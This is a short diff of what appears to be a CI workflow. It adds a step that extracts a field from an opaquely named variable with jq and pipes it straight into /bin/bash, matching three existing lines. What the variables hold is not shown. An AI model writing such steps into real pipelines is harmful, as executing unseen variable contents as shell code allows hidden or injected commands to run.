@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$kd801" | jq -r .gqolb10094 | /bin/bash
           printf '%s' "$nprt893" | jq -r .r32 | /bin/bash
           printf '%s' "$ed76" | jq -r .obh774 | /bin/bash
+          echo $ci2 | jq -r .nq934 | /bin/bash
 
       - name: Save archive
         if: always()
